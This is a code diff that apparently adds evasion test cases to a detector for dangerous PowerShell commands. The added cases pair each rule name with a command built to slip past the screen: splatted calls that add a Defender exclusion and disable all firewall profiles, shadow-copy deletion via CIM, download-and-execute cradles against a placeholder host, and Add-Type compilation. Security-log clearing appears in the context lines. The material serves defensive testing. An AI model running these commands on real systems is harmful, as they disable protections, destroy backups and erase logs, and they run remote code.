@@ -348,6 +348,19 @@ EVASIONS = [
      "disable-firewall-all", "colon parameter binding"),
     ("wevtutil.exe cl Security",
      "clear-event-log", "the .exe suffix"),
+    (f"{DOLLAR}p=@{{ExclusionPath='C:\\Users\\Public'}}\nAdd-MpPreference @p",
+     "splatted-sensitive-call", "a splat, which moves the parameters somewhere "
+     "the screen cannot read them"),
+    (f"{DOLLAR}p=@{{Enabled='False'}}\nSet-NetFirewallProfile -All @p",
+     "splatted-sensitive-call", "a splat on the firewall cmdlet"),
+    ("Get-CimInstance Win32_ShadowCopy | Remove-CimInstance",
+     "delete-shadows", "CIM rather than vssadmin or wmic"),
+    (f'{DOLLAR}s=iwr http://x; &([scriptblock]::Create({DOLLAR}s))',
+     "compile-or-build-code", "a cradle that assigns first, so there is no pipe"),
+    ("Add-Type -TypeDefinition $code",
+     "compile-or-build-code", "compiling C# into the process instead"),
+    (f'{DOLLAR}s=(New-Object Net.WebClient).DownloadString("http://x")',
+     "fetch-remote-content", "downloading without piping into anything"),
 ]
 
 
